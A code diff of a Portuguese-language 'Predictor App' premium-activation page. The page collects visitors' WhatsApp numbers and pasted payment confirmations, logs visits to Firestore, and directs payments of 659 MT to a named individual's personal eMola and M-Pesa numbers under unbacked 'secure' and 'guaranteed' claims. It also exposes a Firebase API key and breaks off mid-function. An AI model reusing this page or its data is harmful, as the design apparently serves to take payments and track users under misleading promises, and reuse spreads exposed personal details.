@@ -6,9 +6,9 @@
   <title>🚀 Predictor App | Ativação Premium via WhatsApp</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+  <!-- Firebase SDK CORRETO -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
 
   <style>
     :root {
@@ -51,7 +51,6 @@
       line-height: 1.5;
     }
 
-    /* Container Mobile First */
     .container {
       max-width: 100%;
       background: var(--light);
@@ -61,7 +60,6 @@
       margin: 0 auto;
     }
 
-    /* Header - Chamativo com cores vibrantes */
     .header {
       background: linear-gradient(135deg, #FF6B35, #F7931E, #FF3D00);
       padding: 24px 20px;
@@ -155,7 +153,6 @@
       z-index: 2;
     }
 
-    /* Price Card - Compacto e Elegante */
     .price-card {
       background: linear-gradient(135deg, #00D4AA, #00B894, #00A67C);
       margin: -18px 20px 20px;
@@ -167,7 +164,6 @@
       z-index: 10;
       box-shadow: var(--shadow-md);
       border: 2px solid rgba(255,255,255,0.3);
-      backdrop-filter: blur(10px);
     }
 
     .price-label {
@@ -210,12 +206,10 @@
       opacity: 0.9;
     }
 
-    /* Content */
     .content {
       padding: 0 16px 24px;
     }
 
-    /* Video Card - Estilo Premium Mobile */
     .video-card {
       background: linear-gradient(135deg, #0F172A 0%, #1E1B4B 100%);
       border-radius: var(--radius-lg);
@@ -226,7 +220,7 @@
     }
 
     .video-card-header {
-      padding: 16px 18px 12px;
+      padding: 14px 16px 10px;
       background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,107,53,0.1));
       border-bottom: 1px solid rgba(255,215,0,0.2);
     }
@@ -241,54 +235,56 @@
       font-size: 11px;
       font-weight: 700;
       color: white;
-      margin-bottom: 10px;
-      letter-spacing: 0.5px;
-    }
-
-    .video-badge i {
-      font-size: 11px;
+      margin-bottom: 8px;
     }
 
     .video-card-header h3 {
-      font-size: 18px;
+      font-size: 17px;
       font-weight: 800;
       color: white;
-      margin-bottom: 6px;
+      margin-bottom: 4px;
       display: flex;
       align-items: center;
       gap: 8px;
     }
 
     .video-card-header p {
-      font-size: 13px;
+      font-size: 12px;
       color: #A5B4FC;
-      line-height: 1.4;
     }
 
     .video-container {
       position: relative;
-      padding-bottom: 56.25%;
-      height: 0;
-      overflow: hidden;
+      width: 100%;
       background: #000;
     }
 
-    .video-container iframe {
+    .video-wrapper {
+      position: relative;
+      width: 100%;
+      padding-bottom: 177.78%;
+      background: #000;
+      overflow: hidden;
+    }
+    
+    .video-wrapper iframe {
       position: absolute;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
       border: none;
+      object-fit: contain;
+      background: #000;
     }
 
     .video-card-footer {
-      padding: 14px 18px;
+      padding: 12px 16px;
       background: rgba(0,0,0,0.4);
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 20px;
+      gap: 16px;
       flex-wrap: wrap;
       border-top: 1px solid rgba(255,215,0,0.15);
     }
@@ -296,33 +292,30 @@
     .step-item {
       display: flex;
       align-items: center;
-      gap: 8px;
-      font-size: 12px;
+      gap: 6px;
+      font-size: 11px;
       color: #E0E7FF;
       font-weight: 500;
     }
 
     .step-item i {
-      width: 28px;
-      height: 28px;
+      width: 24px;
+      height: 24px;
       background: linear-gradient(135deg, #FF6B35, #F7931E);
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 12px;
+      font-size: 11px;
       color: white;
-      font-weight: bold;
     }
 
-    /* WhatsApp Section */
     .whatsapp-section {
       background: linear-gradient(135deg, var(--gray-50), #FFFFFF);
       padding: 18px;
       border-radius: var(--radius-md);
       margin-bottom: 20px;
       border: 2px solid var(--gray-200);
-      position: relative;
       box-shadow: var(--shadow-sm);
     }
 
@@ -429,14 +422,12 @@
       border-left-color: var(--danger);
     }
 
-    /* Warning Box */
     .warning-box {
       background: linear-gradient(135deg, #FFF8E7, #FFEFD0);
       border: 2px solid #FFB300;
       padding: 14px;
       border-radius: var(--radius-sm);
       margin: 16px 0;
-      animation: fadeIn 0.5s ease;
     }
 
     .warning-header {
@@ -471,7 +462,6 @@
       font-size: 12px;
     }
 
-    /* Payment Methods */
     .payment-section {
       margin-bottom: 20px;
     }
@@ -488,13 +478,11 @@
       border-radius: var(--radius-md);
       border: 2px solid var(--gray-200);
       transition: var(--transition);
-      position: relative;
     }
 
     .payment-method.recommended {
       border-color: var(--primary);
       background: linear-gradient(145deg, #F0F7FF, white);
-      box-shadow: 0 2px 8px rgba(0,102,255,0.1);
     }
 
     .method-header {
@@ -560,7 +548,6 @@
     .detail-item:last-child {
       border-bottom: none;
       padding-top: 8px;
-      margin-top: 0;
     }
 
     .detail-label {
@@ -610,7 +597,7 @@
       opacity: 0.7;
     }
 
-    .copy-button:not(:disabled):active {
+    .copy-button:active {
       transform: scale(0.98);
     }
 
@@ -618,7 +605,6 @@
       background: linear-gradient(135deg, var(--success), #00B894);
     }
 
-    /* Confirmação de Pagamento */
     .confirmation-box {
       background: var(--gray-50);
       padding: 16px;
@@ -650,7 +636,6 @@
     .method-option.selected {
       border-color: var(--primary);
       background: linear-gradient(145deg, #F0F7FF, white);
-      box-shadow: 0 2px 8px rgba(0, 102, 255, 0.1);
     }
 
     .method-option-icon {
@@ -681,11 +666,10 @@
 
     textarea.form-input {
       font-family: monospace;
-      min-height: 120px;
+      min-height: 100px;
       padding: 12px;
     }
 
-    /* Support Section */
     .support-section {
       background: linear-gradient(135deg, #0F172A, #1E293B);
       color: white;
@@ -729,8 +713,6 @@
       font-weight: 900;
       color: #FFB347;
       margin: 10px 0;
-      direction: ltr;
-      letter-spacing: 0.5px;
     }
 
     .support-button {
@@ -742,11 +724,8 @@
       padding: 12px 20px;
       border-radius: 12px;
       font-weight: 700;
-      text-decoration: none;
       font-size: 14px;
       border: 2px solid rgba(255, 179, 71, 0.3);
-      transition: var(--transition);
-      margin-top: 6px;
       cursor: pointer;
     }
 
@@ -764,7 +743,6 @@
       gap: 6px;
     }
 
-    /* Footer */
     .footer {
       padding: 20px;
       text-align: center;
@@ -799,17 +777,14 @@
       font-weight: 600;
       color: var(--gray-800);
       text-align: center;
-      line-height: 1.3;
     }
 
     .copyright {
       font-size: 11px;
       color: var(--gray-600);
       margin-top: 10px;
-      font-weight: 500;
     }
 
-    /* Toast */
     .toast {
       position: fixed;
       top: 20px;
@@ -826,11 +801,9 @@
       border-left: 4px solid;
       max-width: 85%;
       text-align: center;
-      animation: slideDown 0.3s ease;
       font-size: 13px;
     }
 
-    /* Modal Styles */
     .modal-overlay {
       position: fixed;
       top: 0;
@@ -888,7 +861,6 @@
       font-size: 18px;
       font-weight: 900;
       color: var(--dark);
-      margin-bottom: 6px;
     }
 
     .modal-close {
@@ -903,9 +875,6 @@
       width: 28px;
       height: 28px;
       border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
     }
 
     .modal-body {
@@ -933,20 +902,17 @@
     .confirmation-item i {
       font-size: 18px;
       color: var(--primary);
-      margin-top: 2px;
     }
 
     .confirmation-item strong {
       display: block;
       font-size: 13px;
       color: var(--dark);
-      margin-bottom: 3px;
     }
 
     .confirmation-item p {
       font-size: 12px;
       color: var(--gray-600);
-      margin: 0;
     }
 
     .modal-warning {
@@ -976,60 +942,12 @@
       font-size: 15px;
       font-weight: 700;
       cursor: pointer;
-      transition: var(--transition);
     }
 
     .modal-button:active {
       transform: scale(0.98);
     }
 
-    /* Animations */
-    @keyframes slideIn {
-      from { opacity: 0; transform: translateY(-8px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    @keyframes slideDown {
-      from { opacity: 0; transform: translate(-50%, -20px); }
-      to { opacity: 1; transform: translate(-50%, 0); }
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    /* Spinner */
-    .spinner {
-      display: inline-block;
-      width: 18px;
-      height: 18px;
-      border: 2px solid rgba(255,255,255,0.3);
-      border-radius: 50%;
-      border-top-color: white;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    /* Utility */
-    .hidden {
-      display: none !important;
-    }
-
-    .shake {
-      animation: shake 0.5s ease-in-out;
-    }
-
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      25% { transform: translateX(-4px); }
-      75% { transform: translateX(4px); }
-    }
-    
-    /* Requirements Box */
     .requirements-box {
       display: flex;
       gap: 12px;
@@ -1055,12 +973,48 @@
       color: var(--gray-300);
     }
 
-    /* Mobile optimizations */
+    .spinner {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    .shake {
+      animation: shake 0.5s ease-in-out;
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-4px); }
+      75% { transform: translateX(4px); }
+    }
+
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(-8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
     @media (max-width: 480px) {
       body {
         padding: 8px;
       }
-      
       .content {
         padding: 0 12px 20px;
       }
@@ -1070,7 +1024,6 @@
 
 <body>
 
-<!-- Toast -->
 <div class="toast" id="toast">
   <div style="display: flex; align-items: center; gap: 8px;">
     <i class="fas fa-check-circle" id="toastIcon"></i>
@@ -1080,399 +1033,189 @@
 
 <div class="container">
 
-  <!-- Header -->
   <div class="header">
     <div class="logo-container">
       <div class="logo">
-        <div class="logo-icon">
-          <i class="fas fa-bolt"></i>
-        </div>
+        <div class="logo-icon"><i class="fas fa-bolt"></i></div>
         <span>VOUCHER-PAY</span>
       </div>
     </div>
-    
-    <div class="badge">
-      <i class="fas fa-shield-alt"></i>
-      PAGAMENTO 100% SEGURO
-    </div>
-    
+    <div class="badge"><i class="fas fa-shield-alt"></i> PAGAMENTO 100% SEGURO</div>
     <h1>ATIVAÇÃO PREMIUM</h1>
     <p class="subtitle">Receba o código via WhatsApp</p>
   </div>
 
-  <!-- Price Card -->
   <div class="price-card">
     <div class="price-label">Valor Total</div>
     <div class="price">659 MT</div>
     <div class="price-period">Acesso por 48 Horas</div>
-    
     <div class="benefits">
-      <div class="benefit">
-        <i class="fas fa-check"></i>
-        <span>Acesso Imediato</span>
-      </div>
-      <div class="benefit">
-        <i class="fas fa-headset"></i>
-        <span>Suporte 24/7</span>
-      </div>
+      <div class="benefit"><i class="fas fa-check"></i><span>Acesso Imediato</span></div>
+      <div class="benefit"><i class="fas fa-headset"></i><span>Suporte 24/7</span></div>
     </div>
   </div>
 
-  <!-- Content -->
   <div class="content">
 
-    <!-- WhatsApp Section -->
     <div class="whatsapp-section">
       <div class="section-header">
-        <div class="section-icon">
-          <i class="fab fa-whatsapp"></i>
-        </div>
+        <div class="section-icon"><i class="fab fa-whatsapp"></i></div>
         <div class="section-title">Digite seu WhatsApp</div>
       </div>
-      
       <div class="form-group">
         <label class="form-label">Número para receber o Voucher:</label>
         <div class="input-container">
           <span class="country-code">+258</span>
-          <input type="tel" 
-                 id="whatsapp" 
-                 class="form-input" 
-                 placeholder="84 123 456" 
-                 maxlength="13"
-                 inputmode="numeric"
-                 autocomplete="tel"
-                 required>
+          <input type="tel" id="whatsapp" class="form-input" placeholder="84 123 456" maxlength="13" inputmode="numeric" autocomplete="tel" required>
         </div>
-        <div class="input-hint">
-          <i class="fas fa-info-circle"></i>
-          Digite 9 dígitos (ex: 84xxxxxxx)
-        </div>
+        <div class="input-hint"><i class="fas fa-info-circle"></i> Digite 9 dígitos (ex: 84xxxxxxx)</div>
       </div>
-      
-      <!-- Status Messages -->
-      <div class="status-message status-success" id="successMessage">
-        <i class="fas fa-check-circle"></i>
-        WhatsApp registrado! Pronto para pagamento.
-      </div>
-      
-      <div class="status-message status-error" id="errorMessage">
-        <i class="fas fa-exclamation-circle"></i>
-        <span id="errorText">Digite 9 dígitos válidos</span>
-      </div>
+      <div class="status-message status-success" id="successMessage"><i class="fas fa-check-circle"></i> WhatsApp registrado! Pronto para pagamento.</div>
+      <div class="status-message status-error" id="errorMessage"><i class="fas fa-exclamation-circle"></i> <span id="errorText">Digite 9 dígitos válidos</span></div>
     </div>
 
-    <!-- Warning Box -->
     <div class="warning-box">
-      <div class="warning-header">
-        <i class="fas fa-exclamation-triangle warning-icon"></i>
-        <div class="warning-title">INSTRUÇÃO IMPORTANTE</div>
-      </div>
-      <div class="warning-text">
-        Ao fazer o pagamento, <strong>VERIFIQUE O NOME: LUCAS JOSÉ</strong> para confirmação. 
-        O código será enviado em 5min após pagamento confirmado.
-      </div>
+      <div class="warning-header"><i class="fas fa-exclamation-triangle warning-icon"></i><div class="warning-title">INSTRUÇÃO IMPORTANTE</div></div>
+      <div class="warning-text">Ao fazer o pagamento, <strong>VERIFIQUE O NOME: LUCAS JOSÉ</strong> para confirmação. O código será enviado em 5min após pagamento confirmado.</div>
     </div>
 
-    <!-- Payment Methods -->
     <div class="payment-section">
       <div class="section-header">
-        <div class="section-icon" style="background: linear-gradient(135deg, var(--primary), #4F46E5);">
-          <i class="fas fa-credit-card"></i>
-        </div>
+        <div class="section-icon" style="background: linear-gradient(135deg, var(--primary), #4F46E5);"><i class="fas fa-credit-card"></i></div>
         <div class="section-title">Método de Pagamento</div>
       </div>
-      
       <div class="payment-methods">
-        
-        <!-- eMola -->
         <div class="payment-method emola recommended">
           <div class="method-header">
-            <div class="method-icon">
-              <i class="fas fa-wallet"></i>
-            </div>
-            <div class="method-info">
-              <div class="method-title">eMOLA</div>
-              <div class="method-subtitle">Mais Usado • Recomendado</div>
-            </div>
+            <div class="method-icon"><i class="fas fa-wallet"></i></div>
+            <div class="method-info"><div class="method-title">eMOLA</div><div class="method-subtitle">Mais Usado • Recomendado</div></div>
           </div>
-          
           <div class="method-details">
-            <div class="detail-item">
-              <span class="detail-label">Número:</span>
-              <span class="detail-value">866890298</span>
-            </div>
-            <div class="detail-item">
-              <span class="account-holder">
-                <i class="fas fa-user-check"></i>
-                Titular: <span style="color: var(--primary);">LUCAS JOSÉ</span>
-              </span>
-            </div>
+            <div class="detail-item"><span class="detail-label">Número:</span><span class="detail-value">866890298</span></div>
+            <div class="detail-item"><span class="account-holder"><i class="fas fa-user-check"></i> Titular: <span style="color: var(--primary);">LUCAS JOSÉ</span></span></div>
           </div>
-          
-          <button class="copy-button" id="emolaBtn" onclick="copyNumber('866890298', this, 'eMola')" disabled>
-            <span class="btn-text">COPIAR NÚMERO</span>
-            <span class="spinner hidden"></span>
-          </button>
+          <button class="copy-button" id="emolaBtn" onclick="copyNumber('866890298', this, 'eMola')" disabled><span class="btn-text">COPIAR NÚMERO</span><span class="spinner hidden"></span></button>
         </div>
-
-        <!-- M-Pesa -->
         <div class="payment-method mpesa">
           <div class="method-header">
-            <div class="method-icon">
-              <i class="fas fa-money-bill-wave"></i>
-            </div>
-            <div class="method-info">
-              <div class="method-title">M-PESA</div>
-              <div class="method-subtitle">Alternativa • Seguro</div>
-            </div>
+            <div class="method-icon"><i class="fas fa-money-bill-wave"></i></div>
+            <div class="method-info"><div class="method-title">M-PESA</div><div class="method-subtitle">Alternativa • Seguro</div></div>
           </div>
-          
           <div class="method-details">
-            <div class="detail-item">
-              <span class="detail-label">Número:</span>
-              <span class="detail-value">848750886</span>
-            </div>
-            <div class="detail-item">
-              <span class="account-holder">
-                <i class="fas fa-user-check"></i>
-                Titular: <span style="color: var(--primary);">LUCAS JOSÉ</span>
-              </span>
-            </div>
+            <div class="detail-item"><span class="detail-label">Número:</span><span class="detail-value">848750886</span></div>
+            <div class="detail-item"><span class="account-holder"><i class="fas fa-user-check"></i> Titular: <span style="color: var(--primary);">LUCAS JOSÉ</span></span></div>
           </div>
-          
-          <button class="copy-button" id="mpesaBtn" onclick="copyNumber('848750886', this, 'M-Pesa')" disabled>
-            <span class="btn-text">COPIAR NÚMERO</span>
-            <span class="spinner hidden"></span>
-          </button>
+          <button class="copy-button" id="mpesaBtn" onclick="copyNumber('848750886', this, 'M-Pesa')" disabled><span class="btn-text">COPIAR NÚMERO</span><span class="spinner hidden"></span></button>
         </div>
       </div>
     </div>
 
-    <!-- Confirmação de Pagamento -->
-    <div class="payment-section" id="paymentConfirmationSection">
+    <div class="payment-section">
       <div class="section-header">
-        <div class="section-icon" style="background: linear-gradient(135deg, var(--success), #00B894);">
-          <i class="fas fa-check-circle"></i>
-        </div>
+        <div class="section-icon" style="background: linear-gradient(135deg, var(--success), #00B894);"><i class="fas fa-check-circle"></i></div>
         <div class="section-title">Enviar Confirmação de Pagamento</div>
       </div>
-      
       <div class="confirmation-box">
-        <!-- Seleção do Método -->
         <div class="form-group">
           <label class="form-label">Método utilizado:</label>
           <div class="method-selection">
-            <div class="method-option" onclick="selectPaymentMethod('emola')" id="methodEmola">
-              <div class="method-option-icon">
-                <i class="fas fa-wallet"></i>
-              </div>
-              <div class="method-option-text">eMola</div>
-            </div>
-            <div class="method-option" onclick="selectPaymentMethod('mpesa')" id="methodMpesa">
-              <div class="method-option-icon">
-                <i class="fas fa-money-bill-wave"></i>
-              </div>
-              <div class="method-option-text">M-Pesa</div>
-            </div>
-          </div>
-          <div class="input-hint">
-            <i class="fas fa-info-circle"></i>
-            Selecione o método que usou para pagar
+            <div class="method-option" onclick="selectPaymentMethod('emola')" id="methodEmola"><div class="method-option-icon"><i class="fas fa-wallet"></i></div><div class="method-option-text">eMola</div></div>
+            <div class="method-option" onclick="selectPaymentMethod('mpesa')" id="methodMpesa"><div class="method-option-icon"><i class="fas fa-money-bill-wave"></i></div><div class="method-option-text">M-Pesa</div></div>
           </div>
           <input type="hidden" id="selectedMethod" value="">
         </div>
-        
-        <!-- Campo para Mensagem/ID da Transação -->
         <div class="form-group">
           <label class="form-label">Mensagem de Confirmação / ID da Transação:</label>
-          <textarea id="transactionMessage" 
-                    class="form-input" 
-                    rows="4"
-                    placeholder="Cole aqui a MENSAGEM COMPLETA de confirmação que recebeu após o pagamento..."
-                    oninput="validateConfirmationForm()"
-                    style="padding: 12px; resize: vertical; min-height: 100px; font-family: monospace; font-size: 13px;"></textarea>
-          <div class="input-hint">
-            <i class="fas fa-info-circle"></i>
-            <span id="charCount">0/100 caracteres mínimos</span>
-            • Cole a mensagem completa recebida após o pagamento
-          </div>
+          <textarea id="transactionMessage" class="form-input" rows="4" placeholder="Cole aqui a MENSAGEM COMPLETA de confirmação que recebeu após o pagamento..." oninput="validateConfirmationForm()" style="padding: 12px; min-height: 100px;"></textarea>
+          <div class="input-hint"><i class="fas fa-info-circle"></i> <span id="charCount">0/100 caracteres mínimos</span> • Cole a mensagem completa</div>
         </div>
-        
-        <!-- Requisitos -->
         <div class="requirements-box">
-          <div class="requirement-item">
-            <i class="fas fa-check-circle" id="methodCheck"></i>
-            <span>Método selecionado</span>
-          </div>
-          <div class="requirement-item">
-            <i class="fas fa-check-circle" id="messageCheck"></i>
-            <span>Mensagem (Colada)</span>
-          </div>
+          <div class="requirement-item"><i class="fas fa-check-circle" id="methodCheck"></i><span>Método selecionado</span></div>
+          <div class="requirement-item"><i class="fas fa-check-circle" id="messageCheck"></i><span>Mensagem (Colada)</span></div>
         </div>
-        
-        <button class="copy-button" id="submitPaymentBtn" onclick="submitPaymentConfirmation()" disabled>
-          <i class="fas fa-paper-plane"></i>
-          <span class="btn-text">ENVIAR CONFIRMAÇÃO</span>
-          <span class="spinner hidden"></span>
-        </button>
+        <button class="copy-button" id="submitPaymentBtn" onclick="submitPaymentConfirmation()" disabled><i class="fas fa-paper-plane"></i><span class="btn-text">ENVIAR CONFIRMAÇÃO</span><span class="spinner hidden"></span></button>
       </div>
     </div>
 
-    <!-- VIDEO CARD - Posicionado acima do suporte com design mobile -->
     <div class="video-card">
       <div class="video-card-header">
-        <div class="video-badge">
-          <i class="fas fa-play-circle"></i>
-          VIDEO TUTORIAL
-        </div>
-        <h3>
-          <i class="fas fa-graduation-cap" style="color: #FFB347;"></i>
-          Como fazer o pagamento?
-        </h3>
+        <div class="video-badge"><i class="fas fa-play-circle"></i> VIDEO TUTORIAL</div>
+        <h3><i class="fas fa-mobile-alt" style="color: #FFB347;"></i> Como fazer o pagamento?</h3>
         <p>Assista ao vídeo e siga o passo a passo</p>
       </div>
       <div class="video-container">
-        <iframe 
-          src="https://www.youtube.com/embed/VXWe8X5OFFM?si=un1s9wF0nQJ1Fxh1" 
-          title="Como fazer pagamento eMola e M-Pesa" 
-          frameborder="0" 
-          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
-          referrerpolicy="strict-origin-when-cross-origin" 
-          allowfullscreen>
-        </iframe>
+        <div class="video-wrapper">
+          <iframe 
+            src="https://www.youtube.com/embed/VXWe8X5OFFM?autoplay=0&controls=1&rel=0&modestbranding=1&playsinline=1&fs=1"
+            title="Como fazer pagamento eMola e M-Pesa" 
+            frameborder="0" 
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" 
+            referrerpolicy="strict-origin-when-cross-origin" 
+            allowfullscreen>
+          </iframe>
+        </div>
       </div>
       <div class="video-card-footer">
-        <div class="step-item">
-          <i class="fas fa-1"></i>
-          <span>Copie o número</span>
-        </div>
-        <div class="step-item">
-          <i class="fas fa-2"></i>
-          <span>Faça o pagamento</span>
-        </div>
-        <div class="step-item">
-          <i class="fas fa-3"></i>
-          <span>Cole a confirmação</span>
-        </div>
+        <div class="step-item"><i class="fas fa-1"></i><span>Copie o número</span></div>
+        <div class="step-item"><i class="fas fa-2"></i><span>Faça o pagamento</span></div>
+        <div class="step-item"><i class="fas fa-3"></i><span>Cole a confirmação</span></div>
       </div>
     </div>
 
-    <!-- Support Section -->
     <div class="support-section">
-      <div class="support-title">
-        <i class="fas fa-headset"></i>
-        PRECISA DE AJUDA?
-      </div>
-      <div class="support-desc">
-        Problemas com pagamento ou não recebeu o código? 
-        Fale diretamente com nosso suporte Via WhatsApp.
-      </div>
+      <div class="support-title"><i class="fas fa-headset"></i> PRECISA DE AJUDA?</div>
+      <div class="support-desc">Problemas com pagamento ou não recebeu o código? Fale diretamente com nosso suporte Via WhatsApp.</div>
       <div class="support-number">+258 866 890 298</div>
-      <button class="support-button" onclick="copySupportNumber()">
-        <i class="fas fa-copy"></i>
-        COPIAR NÚMERO DO SUPORTE
-      </button>
-      <div class="support-hours">
-        <i class="far fa-clock"></i>
-        Atendimento: 8h às 22h
-      </div>
+      <button class="support-button" onclick="copySupportNumber()"><i class="fas fa-copy"></i> COPIAR NÚMERO DO SUPORTE</button>
+      <div class="support-hours"><i class="far fa-clock"></i> Atendimento: 8h às 22h</div>
     </div>
   </div>
 
-  <!-- Footer -->
   <div class="footer">
     <div class="security-grid">
-      <div class="security-item">
-        <i class="fas fa-lock security-icon" style="color: var(--success);"></i>
-        <div class="security-text">Pagamento Seguro</div>
-      </div>
-      <div class="security-item">
-        <i class="fas fa-bolt security-icon" style="color: var(--warning);"></i>
-        <div class="security-text">Entrega Instantânea</div>
-      </div>
-      <div class="security-item">
-        <i class="fas fa-shield-alt security-icon" style="color: var(--primary);"></i>
-        <div class="security-text">Garantia Total</div>
-      </div>
+      <div class="security-item"><i class="fas fa-lock security-icon" style="color: var(--success);"></i><div class="security-text">Pagamento Seguro</div></div>
+      <div class="security-item"><i class="fas fa-bolt security-icon" style="color: var(--warning);"></i><div class="security-text">Entrega Instantânea</div></div>
+      <div class="security-item"><i class="fas fa-shield-alt security-icon" style="color: var(--primary);"></i><div class="security-text">Garantia Total</div></div>
     </div>
-    <div class="copyright">
-      © 2025 Predictor App • Todos os direitos reservados
-    </div>
+    <div class="copyright">© 2025 Predictor App • Todos os direitos reservados</div>
   </div>
 </div>
 
-<!-- Modal de Confirmação -->
 <div class="modal-overlay" id="confirmationModal" style="display: none;">
   <div class="modal-content">
     <div class="modal-header">
-      <div class="modal-icon success">
-        <i class="fas fa-check-circle"></i>
-      </div>
+      <div class="modal-icon success"><i class="fas fa-check-circle"></i></div>
       <h3>✅ Confirmação Enviada!</h3>
-      <button class="modal-close" onclick="closeModal()">
-        <i class="fas fa-times"></i>
-      </button>
+      <button class="modal-close" onclick="closeModal()"><i class="fas fa-times"></i></button>
     </div>
-    
     <div class="modal-body">
       <div class="confirmation-message">
-        <div class="confirmation-item">
-          <i class="fas fa-clock"></i>
-          <div>
-            <strong>⏳ Aguarde a verificação</strong>
-            <p>Processaremos seu pagamento em até 5 minutos</p>
-          </div>
-        </div>
-        
-        <div class="confirmation-item">
-          <i class="fab fa-whatsapp"></i>
-          <div>
-            <strong>📲 Será notificado no WhatsApp</strong>
-            <p>Enviaremos o voucher assim que confirmado</p>
-          </div>
-        </div>
-        
-        <div class="confirmation-item">
-          <i class="fas fa-mobile-alt"></i>
-          <div>
-            <strong>📞 Número registrado:</strong>
-            <p id="modalWhatsappNumber">+258xxxxxxxx</p>
-          </div>
-        </div>
-        
-        <div class="confirmation-item">
-          <i class="fas fa-receipt"></i>
-          <div>
-            <strong>📄 ID da Transação:</strong>
-            <p id="modalTransactionId">Não identificado</p>
-          </div>
-        </div>
+        <div class="confirmation-item"><i class="fas fa-clock"></i><div><strong>⏳ Aguarde a verificação</strong><p>Processaremos seu pagamento em até 5 minutos</p></div></div>
+        <div class="confirmation-item"><i class="fab fa-whatsapp"></i><div><strong>📲 Será notificado no WhatsApp</strong><p>Enviaremos o voucher assim que confirmado</p></div></div>
+        <div class="confirmation-item"><i class="fas fa-mobile-alt"></i><div><strong>📞 Número registrado:</strong><p id="modalWhatsappNumber">+258xxxxxxxx</p></div></div>
+        <div class="confirmation-item"><i class="fas fa-receipt"></i><div><strong>📄 ID da Transação:</strong><p id="modalTransactionId">Não identificado</p></div></div>
       </div>
-      
-      <div class="modal-warning">
-        <i class="fas fa-exclamation-circle"></i>
-        <span>Aguarde a nossa Notificação no WhatsApp</span>
-      </div>
+      <div class="modal-warning"><i class="fas fa-exclamation-circle"></i><span>Aguarde a nossa Notificação no WhatsApp</span></div>
     </div>
-    
-    <div class="modal-footer">
-      <button class="modal-button" onclick="closeModal()">
-        <i class="fas fa-check"></i>
-        ENTENDIDO
-      </button>
-    </div>
+    <div class="modal-footer"><button class="modal-button" onclick="closeModal()"><i class="fas fa-check"></i> ENTENDIDO</button></div>
   </div>
 </div>
 
 <script>
-  // ==================== CONFIGURAÇÃO DO SISTEMA ====================
-  const STORAGE_KEY_WHATSAPP = 'predictor_whatsapp_mobile';
-  const STORAGE_KEY_LOGS = 'predictor_registration_logs';
-  const STORAGE_KEY_COPY_LOGS = 'predictor_copy_logs';
-  const STORAGE_KEY_PAYMENTS = 'predictor_payment_confirmations';
-  const STORAGE_KEY_SITE_VISITS = 'payment_site_visits_log';
-  
+  // ==================== CONFIGURAÇÃO DO FIREBASE ====================
+  const firebaseConfig = {
+    apiKey: "AIzaSyDbPB6XBF3J1VY0X0ZQj2SKu8",
+    authDomain: "whatsapp-24492.firebaseapp.com",
+    projectId: "whatsapp-24492",
+    storageBucket: "whatsapp-24492.appspot.com",
+    messagingSenderId: "529970939424",
+    appId: "1:529970939424:web:7d46554c2e8f9a1b2c3d"
+  };
+
   // ==================== VARIÁVEIS GLOBAIS ====================
+  const STORAGE_KEY_WHATSAPP = 'predictor_whatsapp_mobile';
+  const STORAGE_KEY_PAYMENTS = 'predictor_payment_confirmations';
+  
   const whatsappInput = document.getElementById('whatsapp');
   const successMessage = document.getElementById('successMessage');
   const errorMessage = document.getElementById('errorMessage');
@@ -1482,7 +1225,6 @@
   const toastIcon = document.getElementById('toastIcon');
   const emolaBtn = document.getElementById('emolaBtn');
   const mpesaBtn = document.getElementById('mpesaBtn');
-  
   const transactionMessageInput = document.getElementById('transactionMessage');
   const submitPaymentBtn = document.getElementById('submitPaymentBtn');
   const charCount = document.getElementById('charCount');
@@ -1495,102 +1237,112 @@
   
   let isWhatsappValid = false;
   let currentWhatsappNumber = '';
-  let firebaseAvailable = false;
+  let db = null;
+  let firebaseReady = false;
   let selectedPaymentMethod = '';
   let currentSessionId = 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
 
   // ==================== INICIALIZAR FIREBASE ====================
   function initializeFirebase() {
     try {
-      if (typeof firebase !== 'undefined') {
-        const firebaseConfig = {
-          apiKey: "AIzaSyDbPB6XBF3J1VY0X0ZQj2SKu8",
-          authDomain: "whatsapp-24492.firebaseapp.com",
-          projectId: "whatsapp-24492",
-          storageBucket: "whatsapp-24492.appspot.com",
-          messagingSenderId: "5299709394245",
-          appId: "1:5299709394245:web:7d46554&c2e",
-          measurementId: "G-FAKLLOK27H"
-        };
-        
-        if (!firebase.apps.length) {
-          firebase.initializeApp(firebaseConfig);
-        }
-        firebaseAvailable = true;
-        console.log('✅ Firebase disponível');
+      if (firebase.apps.length === 0) {
+        firebase.initializeApp(firebaseConfig);
+        console.log('🔥 Firebase inicializado');
       }
+      
+      db = firebase.firestore();
+      
+      // Testar conexão silenciosamente
+      db.collection('test').doc('connection').set({
+        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+        test: true
+      }).then(() => {
+        firebaseReady = true;
+        console.log('✅ Firebase conectado');
+        registerSiteVisit();
